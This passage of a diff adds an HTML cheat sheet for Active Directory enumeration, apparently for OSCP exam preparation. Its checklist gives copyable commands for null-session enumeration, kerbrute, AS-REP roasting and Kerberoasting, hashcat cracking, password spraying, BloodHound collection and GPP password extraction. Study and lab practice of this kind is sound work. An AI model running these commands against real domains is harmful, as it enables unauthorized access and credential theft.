@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ENUM_PATTERN_BANK // ad · enumeration methodology</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Stencil+Text:wght@400;700;900&family=JetBrains+Mono:wght@300;400;500;700;800&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #0a0d12;
+    --bg-elev: #11151c;
+    --bg-card: #0f1219;
+    --bg-card-hover: #141823;
+    --border: #1d2230;
+    --border-strong: #2a3145;
+    --text: #d8dde6;
+    --text-dim: #8b94a7;
+    --text-faint: #4a5266;
+
+    --setup: #ffb547;
+    --setup-soft: #ffb54720;
+    --access: #ff6b6b;
+    --access-soft: #ff6b6b18;
+    --enum: #5ec3e3;
+    --enum-soft: #5ec3e318;
+    --abuse: #d96cd9;
+    --abuse-soft: #d96cd918;
+    --win: #5fd49b;
+    --win-soft: #5fd49b18;
+    --warn: #ff6b6b;
+    --warn-soft: #ff6b6b18;
+
+    /* THEME ACCENT — enum bank */
+    --theme: var(--enum);
+    --theme-soft: var(--enum-soft);
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    background: var(--bg-base);
+    color: var(--text);
+    font-family: 'IBM Plex Sans', -apple-system, sans-serif;
+    font-size: 14px;
+    line-height: 1.5;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(circle at 15% 20%, rgba(94, 195, 227, 0.05) 0%, transparent 40%),
+      radial-gradient(circle at 85% 80%, rgba(95, 212, 155, 0.03) 0%, transparent 40%);
+    background-attachment: fixed;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    background: repeating-linear-gradient(0deg,
+      rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px,
+      transparent 1px, transparent 3px);
+    z-index: 1;
+  }
+
+  ::selection { background: var(--theme); color: var(--bg-base); }
+  ::-webkit-scrollbar { width: 8px; height: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg-base); }
+  ::-webkit-scrollbar-thumb { background: var(--border-strong); }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-faint); }
+  a { color: inherit; text-decoration: none; }
+
+  /* ==================== HEADER ==================== */
+  .header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(10, 13, 18, 0.94);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 28px 12px;
+  }
+  .header-top { display: flex; align-items: baseline; justify-content: space-between; gap: 20px; margin-bottom: 12px; }
+  .brand {
+    font-family: 'Big Shoulders Stencil Text', sans-serif;
+    font-weight: 900;
+    font-size: 30px;
+    letter-spacing: 0.08em;
+    line-height: 0.9;
+    text-transform: uppercase;
+  }
+  .brand .ad { color: var(--theme); }
+  .brand-tag { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.15em; text-transform: uppercase; margin-top: 4px; }
+  .meta { text-align: right; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; }
+  .meta .count { color: var(--win); font-weight: 700; }
+
+  .search-row { display: flex; gap: 12px; align-items: stretch; }
+  .search-box { flex: 1; position: relative; }
+  .search-input {
+    width: 100%;
+    background: var(--bg-card);
+    border: 1px solid var(--border-strong);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    font-weight: 500;
+    padding: 11px 90px 11px 36px;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+  .search-input:focus { border-color: var(--theme); box-shadow: 0 0 0 3px var(--theme-soft); }
+  .search-input::placeholder { color: var(--text-faint); }
+  .search-prefix { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--theme); font-family: 'JetBrains Mono', monospace; font-weight: 700; pointer-events: none; }
+  .search-kbd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); display: flex; gap: 4px; pointer-events: none; }
+  .kbd { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-dim); background: var(--bg-base); border: 1px solid var(--border-strong); padding: 2px 6px; letter-spacing: 0.05em; }
+
+  .nav { margin-top: 12px; display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
+  .nav-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 8px; }
+  .nav a { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); padding: 4px 10px; border: 1px solid var(--border-strong); text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; }
+  .nav a:hover { color: var(--text); border-color: var(--text-dim); }
+  .nav a[data-phase="setup"]:hover { color: var(--setup); border-color: var(--setup); }
+  .nav a[data-phase="access"]:hover { color: var(--access); border-color: var(--access); }
+  .nav a[data-phase="enum"]:hover { color: var(--enum); border-color: var(--enum); }
+  .nav a[data-phase="abuse"]:hover { color: var(--abuse); border-color: var(--abuse); }
+  .nav a[data-phase="win"]:hover { color: var(--win); border-color: var(--win); }
+
+  main { max-width: 1400px; margin: 0 auto; padding: 28px 28px 60px; position: relative; z-index: 2; }
+
+  .topology { background: var(--bg-card); border: 1px solid var(--border-strong); border-left: 3px solid var(--theme); padding: 16px 18px; margin-bottom: 32px; font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.7; }
+  .topology h3 { font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; }
+  .topology code { color: var(--text); background: var(--bg-base); padding: 1px 5px; font-size: 11px; }
+
+  section.flow { margin-bottom: 56px; scroll-margin-top: 180px; }
+  .flow-head { display: flex; align-items: baseline; justify-content: space-between; gap: 16px; margin-bottom: 6px; padding-bottom: 8px; border-bottom: 1px solid var(--border-strong); }
+  .flow-num { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.15em; }
+  .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 800; letter-spacing: 0.02em; flex: 1; }
+  .flow-trigger { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); letter-spacing: 0.05em; text-align: right; max-width: 360px; }
+  .flow-trigger strong { color: var(--theme); font-weight: 500; }
+  .flow-intro { font-size: 13px; color: var(--text-dim); margin-bottom: 18px; max-width: 850px; line-height: 1.65; }
+  .flow-intro code { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; color: var(--text); background: var(--bg-card); padding: 1px 5px; border: 1px solid var(--border); }
+
+  .reminder { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); border: 1px dashed var(--border-strong); padding: 6px 12px; font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--text-dim); margin: 8px 8px 8px 0; }
+  .reminder.timing { border-left: 2px solid var(--setup); }
+  .reminder.flag { border-left: 2px solid var(--win); color: var(--win); }
+  .reminder.danger { border-left: 2px solid var(--warn); color: var(--warn); }
+  .reminder::before { font-weight: 800; color: inherit; }
+  .reminder.timing::before { content: '⏱'; }
+  .reminder.flag::before { content: '⚑'; }
+  .reminder.danger::before { content: '⚠'; }
+
+  .diagram { background: var(--bg-card); border: 1px solid var(--border); padding: 20px 16px; margin: 18px 0 22px; overflow-x: auto; }
+  .diagram svg { display: block; width: 100%; height: auto; }
+  .diagram svg .node-rect { fill: var(--bg-base); stroke: var(--border-strong); stroke-width: 1.2; transition: stroke 0.15s, fill 0.15s; }
+  .diagram svg a:hover .node-rect { fill: var(--bg-card-hover); stroke: var(--text-dim); cursor: pointer; }
+  .diagram svg .node-rect.setup  { stroke: var(--setup); }
+  .diagram svg .node-rect.access { stroke: var(--access); }
+  .diagram svg .node-rect.enum   { stroke: var(--enum); }
+  .diagram svg .node-rect.abuse  { stroke: var(--abuse); }
+  .diagram svg .node-rect.win    { stroke: var(--win); }
+  .diagram svg .node-rect.warn   { stroke: var(--warn); stroke-dasharray: 4 3; }
+  .diagram svg .node-text { fill: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; text-anchor: middle; pointer-events: none; }
+  .diagram svg .node-sub { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .arrow { stroke: var(--text-faint); stroke-width: 1.2; fill: none; marker-end: url(#arrowhead); }
+  .diagram svg .arrow-strong { stroke: var(--text-dim); stroke-width: 1.5; fill: none; marker-end: url(#arrowhead-strong); }
+  .diagram svg .arrow-warn   { stroke: var(--warn); stroke-width: 1.2; fill: none; stroke-dasharray: 4 3; marker-end: url(#arrowhead-warn); }
+  .diagram svg .label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-anchor: middle; pointer-events: none; }
+  .diagram svg .label.warn { fill: var(--warn); }
+  .diagram svg .label.win  { fill: var(--win); }
+  .diagram svg .group-bg { fill: rgba(94, 195, 227, 0.03); stroke: var(--border); stroke-dasharray: 3 3; stroke-width: 1; }
+  .diagram svg .group-label { fill: var(--text-faint); font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; }
+
+  .cards-section { margin-top: 60px; padding-top: 24px; border-top: 1px solid var(--border-strong); scroll-margin-top: 180px; }
+  .filters { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin: 14px 0 20px; }
+  .filter-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.15em; margin-right: 4px; }
+  .pill { font-family: 'JetBrains Mono', monospace; font-size: 10.5px; font-weight: 500; color: var(--text-dim); background: transparent; border: 1px solid var(--border-strong); padding: 5px 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.12s; user-select: none; }
+  .pill:hover { border-color: var(--text-dim); color: var(--text); }
+  .pill.active { background: var(--theme); color: var(--bg-base); border-color: var(--theme); font-weight: 700; }
+  .pill .pill-count { opacity: 0.65; margin-left: 4px; font-weight: 400; }
+  .pill.active .pill-count { opacity: 0.7; }
+
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 14px; }
+  .card { background: var(--bg-card); border: 1px solid var(--border); padding: 15px 15px 13px; position: relative; transition: border-color 0.15s, background 0.15s; display: flex; flex-direction: column; gap: 9px; scroll-margin-top: 200px; }
+  .card:hover { border-color: var(--border-strong); background: var(--bg-card-hover); }
+  .card[data-phase="setup"]  { border-left: 3px solid var(--setup); }
+  .card[data-phase="access"] { border-left: 3px solid var(--access); }
+  .card[data-phase="enum"]   { border-left: 3px solid var(--enum); }
+  .card[data-phase="abuse"]  { border-left: 3px solid var(--abuse); }
+  .card[data-phase="win"]    { border-left: 3px solid var(--win); }
+  .card.flash { animation: flash 1.2s ease-out; }
+  @keyframes flash { 0%, 30% { background: var(--theme-soft); border-color: var(--theme); } 100% { background: var(--bg-card); border-color: var(--border); } }
+
+  .card-head { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; }
+  .card-cat { font-family: 'JetBrains Mono', monospace; font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; padding: 2px 6px; border: 1px solid; flex-shrink: 0; white-space: nowrap; }
+  .card[data-phase="setup"]  .card-cat { color: var(--setup); border-color: var(--setup); }
+  .card[data-phase="access"] .card-cat { color: var(--access); border-color: var(--access); }
+  .card[data-phase="enum"]   .card-cat { color: var(--enum); border-color: var(--enum); }
+  .card[data-phase="abuse"]  .card-cat { color: var(--abuse); border-color: var(--abuse); }
+  .card[data-phase="win"]    .card-cat { color: var(--win); border-color: var(--win); }
+  .card-title { font-family: 'JetBrains Mono', monospace; font-size: 13.5px; font-weight: 700; color: var(--text); line-height: 1.3; flex: 1; }
+
+  .triggers { display: flex; flex-wrap: wrap; gap: 4px; }
+  .trigger { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--theme); background: var(--theme-soft); border: 1px solid var(--theme-soft); padding: 2px 7px; letter-spacing: 0.02em; }
+  .trigger.match { background: var(--theme); color: var(--bg-base); font-weight: 700; }
+
+  .arrow-line { display: flex; align-items: flex-start; gap: 8px; padding: 8px 10px; background: var(--bg-base); border: 1px solid var(--border); }
+  .arrow { color: var(--win); font-family: 'JetBrains Mono', monospace; font-weight: 800; flex-shrink: 0; }
+  .action { color: var(--text); font-size: 12.5px; line-height: 1.5; }
+
+  .cmd-wrap { position: relative; }
+  .cmd { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); background: var(--bg-base); border: 1px solid var(--border); padding: 9px 36px 9px 11px; white-space: pre-wrap; word-break: break-all; line-height: 1.5; overflow-x: auto; }
+  .cmd-copy { position: absolute; top: 4px; right: 4px; background: var(--bg-card); border: 1px solid var(--border-strong); color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 9px; padding: 3px 6px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em; opacity: 0; transition: opacity 0.15s, color 0.15s; }
+  .cmd-wrap:hover .cmd-copy { opacity: 1; }
+  .cmd-copy:hover { color: var(--theme); }
+  .cmd-copy.copied { color: var(--win); border-color: var(--win); opacity: 1; }
+
+  .cleanup { background: var(--warn-soft); border: 1px solid var(--warn); border-left-width: 3px; padding: 8px 11px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text); line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+  .cleanup-label { color: var(--warn); font-size: 9px; text-transform: uppercase; letter-spacing: 0.15em; display: block; margin-bottom: 4px; font-weight: 700; }
+
+  .card-foot { display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-top: auto; padding-top: 4px; border-top: 1px dashed var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); }
+  .state-tag { color: var(--text-dim); border: 1px solid var(--border); padding: 1px 6px; font-size: 9px; letter-spacing: 0.1em; }
+  .state-tag.user { color: var(--setup); border-color: var(--setup); }
+  .state-tag.admin { color: var(--access); border-color: var(--access); }
+  .state-tag.both { color: var(--text-dim); border-color: var(--border-strong); }
+
+  mark { background: var(--theme); color: var(--bg-base); padding: 0 2px; font-weight: 700; }
+
+  .empty { text-align: center; padding: 80px 20px; color: var(--text-faint); font-family: 'JetBrains Mono', monospace; }
+  .empty-icon { font-size: 48px; color: var(--border-strong); margin-bottom: 16px; }
+  .empty-title { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.15em; }
+  .empty-hint { font-size: 12px; color: var(--text-faint); }
+
+  .anti-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 12px; margin-top: 18px; }
+  .anti { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--warn); padding: 12px 14px; }
+  .anti-bad { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--warn); margin-bottom: 4px; line-height: 1.4; }
+  .anti-bad::before { content: '✗ '; font-weight: 800; }
+  .anti-fix { font-size: 12px; color: var(--text-dim); line-height: 1.5; }
+  .anti-fix::before { content: '→ '; color: var(--win); font-weight: 800; }
+
+  .foot-info { margin-top: 60px; padding-top: 20px; border-top: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-faint); text-align: center; line-height: 1.8; letter-spacing: 0.05em; }
+  .foot-info code { color: var(--theme); background: var(--theme-soft); padding: 1px 5px; }
+
+  /* CHECKLIST */
+  .checklist { background: var(--bg-card); border: 1px solid var(--border); padding: 18px 22px; margin: 14px 0 22px; }
+  .checklist-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--theme); letter-spacing: 0.18em; text-transform: uppercase; margin-bottom: 12px; }
+  .checklist ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 4px 18px; }
+  .checklist li { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 5px 0; color: var(--text); display: flex; align-items: flex-start; gap: 9px; line-height: 1.5; cursor: pointer; user-select: none; }
+  .checklist li::before { content: '[ ]'; color: var(--text-faint); font-weight: 700; flex-shrink: 0; transition: color 0.15s; }
+  .checklist li.done { color: var(--text-faint); text-decoration: line-through; }
+  .checklist li.done::before { content: '[✓]'; color: var(--win); }
+  .checklist li code { color: var(--theme); font-size: 11px; }
+
+  @media (max-width: 720px) {
+    .header { padding: 12px 14px 10px; }
+    main { padding: 18px 14px 40px; }
+    .brand { font-size: 22px; }
+    .grid { grid-template-columns: 1fr; }
+    .search-kbd { display: none; }
+    .flow-head { flex-direction: column; align-items: flex-start; }
+    .flow-trigger { text-align: left; max-width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-top">
+    <div>
+      <div class="brand">ENUM<span class="ad">_</span>PATTERN<span class="ad">_</span>BANK</div>
+      <div class="brand-tag">// oscp · ad enumeration · see → enumerate → list</div>
+    </div>
+    <div class="meta">
+      <div>SHOWING <span class="count" id="resultCount">0</span> / <span id="totalCount">0</span></div>
+      <div style="margin-top:4px; opacity:0.6">v1 · enum · companion to ad/privesc/pivot banks</div>
+    </div>
+  </div>
+
+  <div class="search-row">
+    <div class="search-box">
+      <span class="search-prefix">▸</span>
+      <input id="search" class="search-input" type="text" autocomplete="off" spellcheck="false"
+        placeholder="search trigger: 'bloodhound', 'smb null', 'kerbrute', 'ldap', 'spn', 'shares', 'asrep list' ..." />
+      <span class="search-kbd"><kbd class="kbd">⌘</kbd><kbd class="kbd">K</kbd></span>
+    </div>
+  </div>
+
+  <div class="nav">
+    <span class="nav-label">JUMP:</span>
+    <a href="#scan" data-phase="setup">scan</a>
+    <a href="#unauth" data-phase="enum">unauth</a>
+    <a href="#user-disc" data-phase="enum">user-disc</a>
+    <a href="#auth" data-phase="enum">authed</a>
+    <a href="#bloodhound" data-phase="abuse">bloodhound</a>
+    <a href="#shares" data-phase="enum">shares</a>
+    <a href="#adcs" data-phase="abuse">adcs</a>
+    <a href="#cards" style="margin-left:auto">all-cards</a>
+  </div>
+</header>
+
+<main>
+
+<div class="topology">
+  <h3>SCOPE · ENUMERATION FOCUS</h3>
+  <div>
+    <code>goal</code>: list everything before attacking anything ·
+    <code>state</code>: from zero (no creds) → through domain user creds ·
+    <code>output</code>: <span style="color:var(--theme)">users.txt</span>, <span style="color:var(--theme)">groups.txt</span>, <span style="color:var(--theme)">hosts.txt</span>, <span style="color:var(--theme)">shares.txt</span>, BloodHound graph ·
+    <code>principle</code>: enumeration is the answer when you're stuck — go wider, not deeper
+  </div>
+</div>
+
+<!-- ============================================================
+     METHODOLOGY CHECKLIST
+     ============================================================ -->
+<section>
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 00 ]</span>
+      <span class="flow-title" style="color:var(--theme)">METHODOLOGY CHECKLIST · AD ENUM</span>
+    </div>
+    <div class="flow-trigger">click to mark done · resets on reload</div>
+  </div>
+  <p class="flow-intro">
+    The full enum sweep, in order. If you finish this list and don't have a path, you skipped something. Re-do, don't escalate. The decision point is always: <code>do I have creds yet?</code> — that determines which branch you're on.
+  </p>
+
+  <div class="checklist">
+    <div class="checklist-title">▸ 0. CONTEXT — establish domain basics first</div>
+    <ul>
+      <li>Domain name — <code>nmcli dev show | grep DNS</code> or <code>cat /etc/resolv.conf</code> or from nmap banner</li>
+      <li>DC IP — <code>nslookup -type=SRV _ldap._tcp.&lt;domain&gt;</code> or SMB/LDAP banner</li>
+      <li>Add to /etc/hosts — <code>echo "&lt;DC-IP&gt; &lt;domain&gt; dc.&lt;domain&gt;" | sudo tee -a /etc/hosts</code></li>
+      <li>Set DOMAIN var — <code>export DOMAIN=&lt;domain&gt;; export DC=&lt;DC-IP&gt;</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 1. UNAUTHENTICATED — before you have any creds</div>
+    <ul>
+      <li>Full port scan on DC — <code>sudo nmap -p- --min-rate 5000 -Pn $DC -oN scans/dc-tcp.txt</code></li>
+      <li>AD-specific ports — <code>nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,5985 $DC -oN scans/dc-svc.txt</code></li>
+      <li>SMB null — <code>smbclient -L //$DC -N</code> then <code>smbclient //$DC/IPC$ -N</code></li>
+      <li>enum4linux-ng — <code>enum4linux-ng -A $DC 2&gt;/dev/null | tee scans/enum4linux.txt</code></li>
+      <li>LDAP anon bind — <code>ldapsearch -x -H ldap://$DC -s base "(objectclass=*)" 2&gt;/dev/null | tee scans/ldap-anon.txt</code></li>
+      <li>RPC null → user list — <code>rpcclient -U "" -N $DC -c "enumdomusers" 2&gt;/dev/null</code></li>
+      <li>RID brute (no creds) — <code>nxc smb $DC -u '' -p '' --rid-brute 4000 2&gt;/dev/null | grep "SidTypeUser"</code></li>
+      <li>Kerberos user enum — <code>kerbrute userenum -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $DC</code></li>
+      <li>Save users list — extract usernames to <code>users.txt</code>, one per line</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 2. PRE-AUTH KERBEROS — run with users.txt, no password needed</div>
+    <ul>
+      <li>AS-REP roast — <code>impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat | tee scans/asrep.txt</code></li>
+      <li>Crack AS-REP hashes — <code>hashcat -m 18200 scans/asrep.txt /usr/share/wordlists/rockyou.txt</code></li>
+      <li>Password spray (FIRST check lockout policy!) — <code>nxc smb $DC -u users.txt -p 'Password123' --no-bruteforce</code></li>
+      <li>Spray seasonal patterns — <code>nxc smb $DC -u users.txt -p 'Spring2024!','Summer2024!' --no-bruteforce</code></li>
+      <li>Username = password spray — <code>nxc smb $DC -u users.txt -p users.txt --no-bruteforce</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 3. AUTHENTICATED — once you have user:pass</div>
+    <ul>
+      <li>Validate + find local admin — <code>nxc smb &lt;subnet&gt;/24 -u &lt;user&gt; -p &lt;pwd&gt; 2&gt;/dev/null</code> → look for Pwn3d!</li>
+      <li>Password policy — <code>nxc smb $DC -u &lt;user&gt; -p &lt;pwd&gt; --pass-pol</code> → note lockout threshold</li>
+      <li>Shares + spider — <code>nxc smb $DC -u &lt;user&gt; -p &lt;pwd&gt; --shares</code> then <code>nxc smb $DC -u &lt;user&gt; -p &lt;pwd&gt; -M spider_plus</code></li>
+      <li>LDAP authed dump — <code>ldapdomaindump -u "$DOMAIN\\&lt;user&gt;" -p "&lt;pwd&gt;" $DC -o ldap-dump/</code></li>
+      <li>windapsearch — <code>windapsearch -m domain-admins --dc $DC -d $DOMAIN -u &lt;user&gt; -p &lt;pwd&gt;</code></li>
+      <li>Kerberoast — <code>impacket-GetUserSPNs $DOMAIN/&lt;user&gt;:&lt;pwd&gt; -dc-ip $DC -request | tee scans/kerb.txt</code></li>
+      <li>Crack TGS hashes — <code>hashcat -m 13100 scans/kerb.txt /usr/share/wordlists/rockyou.txt</code></li>
+      <li>BloodHound collect — <code>bloodhound-python -c All -d $DOMAIN -u &lt;user&gt; -p &lt;pwd&gt; -ns $DC --zip 2&gt;/dev/null</code></li>
+      <li>Upload zip to BloodHound → Analysis → Shortest Paths to Domain Admins</li>
+      <li>ADCS vulnerable templates — <code>certipy find -u "&lt;user&gt;@$DOMAIN" -p "&lt;pwd&gt;" -dc-ip $DC -vulnerable 2&gt;/dev/null | tee scans/adcs.txt</code></li>
+      <li>Domain trusts — <code>nxc smb $DC -u &lt;user&gt; -p &lt;pwd&gt; -M enum_trusts</code></li>
+      <li>SYSVOL + GPP creds — <code>nxc smb $DC -u &lt;user&gt; -p &lt;pwd&gt; -M gpp_password</code> and <code>-M gpp_autologin</code></li>
+      <li>Description field hunt — <code>ldapsearch -x -H ldap://$DC -D "&lt;user&gt;@$DOMAIN" -w "&lt;pwd&gt;" -b "DC=&lt;domain&gt;" "(description=*)" description</code></li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 4. SPRAY CADENCE — avoid lockout</div>
+    <ul>
+      <li>Always check lockout before spraying — <code>nxc smb $DC -u &lt;user&gt; -p &lt;pwd&gt; --pass-pol</code></li>
+      <li>1 password per round · wait threshold × 2 minutes between rounds</li>
+      <li>After every new cred → rerun nxc sweep on /24 for Pwn3d! before anything else</li>
+    </ul>
+  </div>
+  <div class="reminder timing">budget: 30–45 min unauth · 45–60 min authed sweep</div>
+  <div class="reminder flag">stuck = re-enumerate. bloodhound collects stale if you ran it before marking more nodes owned.</div>
+  <div class="reminder danger">check lockout policy BEFORE every spray round — one bad round locks the whole domain</div>
+</section>
+
+<!-- ============================================================
+     FLOW 1: ENUMERATION DECISION TREE
+     ============================================================ -->
+<section id="scan" class="flow">
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 01 ]</span>
+      <span class="flow-title" style="color:var(--theme)">DECISION FLOW · WHAT TO ENUM, WHEN</span>
+    </div>
+    <div class="flow-trigger">
+      TRIGGER · <strong>"what do I do with this open port?"</strong>
+    </div>
+  </div>
+  <p class="flow-intro">
+    The big picture: your enum approach branches on <code>do I have creds?</code>. Without creds, you're hunting for usernames (kerbrute, RID) and unauth shares. With creds, you go full sweep — BloodHound first, then targeted queries. Pre-auth Kerberos (AS-REP) is a free credless win — always run it.
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 1100 540" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arrowhead" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+          <path d="M0,0 L10,5 L0,10 z" fill="#4a5266"/>
+        </marker>
+        <marker id="arrowhead-strong" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+          <path d="M0,0 L10,5 L0,10 z" fill="#8b94a7"/>
+        </marker>
+        <marker id="arrowhead-warn" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+          <path d="M0,0 L10,5 L0,10 z" fill="#ff6b6b"/>
+        </marker>
+      </defs>
+
+      <!-- Top: full port scan -->
+      <a href="#card-nmap-full"><rect class="node-rect setup" x="440" y="10" width="220" height="50"/>
+        <text class="node-text" x="550" y="34">FULL TCP + AD UDP SCAN</text>
+        <text class="node-sub" x="550" y="48">88·389·445·5985·636 on every host</text></a>
+
+      <!-- Branch decision -->
+      <path class="arrow-strong" d="M 550 60 L 550 90"/>
+      <a href="#card-creds-check">
+        <rect class="node-rect enum" x="440" y="90" width="220" height="40"/>
+        <text class="node-text" x="550" y="113">DO I HAVE CREDS?</text>
+      </a>
+
+      <!-- Branch arrows -->
+      <path class="arrow-strong" d="M 460 130 Q 280 160 200 195"/>
+      <path class="arrow-strong" d="M 640 130 Q 820 160 900 195"/>
+
+      <text class="label" x="320" y="155" style="font-size:11px; fill:#ffb547">NO CREDS</text>
+      <text class="label" x="780" y="155" style="font-size:11px; fill:#5fd49b">HAVE CREDS</text>
+
+      <!-- LEFT branch: unauth -->
+      <rect class="group-bg" x="20" y="180" width="420" height="340"/>
+      <text class="group-label" x="40" y="200">UNAUTH BRANCH</text>
+
+      <a href="#card-smb-null"><rect class="node-rect enum" x="40" y="215" width="380" height="40"/>
+        <text class="node-text" x="230" y="237">SMB null + enum4linux-ng</text>
+        <text class="node-sub" x="230" y="250">domain, users, shares (sometimes)</text></a>
+      <path class="arrow" d="M 230 255 L 230 270"/>
+
+      <a href="#card-ldap-anon"><rect class="node-rect enum" x="40" y="270" width="380" height="40"/>
+        <text class="node-text" x="230" y="292">LDAP anonymous bind</text>
+        <text class="node-sub" x="230" y="305">defaultNamingContext, sometimes users</text></a>
+      <path class="arrow" d="M 230 310 L 230 325"/>
+
+      <a href="#card-rpc-null"><rect class="node-rect enum" x="40" y="325" width="380" height="40"/>
+        <text class="node-text" x="230" y="347">RPC null → enumdomusers / RID brute</text>
+        <text class="node-sub" x="230" y="360">often returns user list when SMB doesn't</text></a>
+      <path class="arrow" d="M 230 365 L 230 380"/>
+
+      <a href="#card-kerbrute"><rect class="node-rect enum" x="40" y="380" width="380" height="40"/>
+        <text class="node-text" x="230" y="402">kerbrute userenum (88/UDP)</text>
+        <text class="node-sub" x="230" y="415">validates list · NO CREDS NEEDED</text></a>
+      <path class="arrow" d="M 230 420 L 230 435"/>
+
+      <a href="#card-asrep-list"><rect class="node-rect abuse" x="40" y="435" width="380" height="40"/>
+        <text class="node-text" x="230" y="457">GetNPUsers (AS-REP roastable)</text>
+        <text class="node-sub" x="230" y="470">free hashes if pre-auth disabled</text></a>
+      <path class="arrow" d="M 230 475 L 230 490"/>
+
+      <a href="#card-spray-known"><rect class="node-rect abuse" x="40" y="490" width="380" height="24"/>
+        <text class="node-text" x="230" y="507">spray known/weak pwds vs users.txt</text></a>
+
+      <!-- RIGHT branch: authed -->
+      <rect class="group-bg" x="660" y="180" width="420" height="340"/>
+      <text class="group-label" x="680" y="200">AUTHED BRANCH</text>
+
+      <a href="#card-cme-validate"><rect class="node-rect enum" x="680" y="215" width="380" height="40"/>
+        <text class="node-text" x="870" y="237">cme smb &lt;range&gt; -u U -p P</text>
+        <text class="node-sub" x="870" y="250">find Pwn3d! → local admin</text></a>
+      <path class="arrow" d="M 870 255 L 870 270"/>
+
+      <a href="#card-passpol"><rect class="node-rect enum" x="680" y="270" width="380" height="40"/>
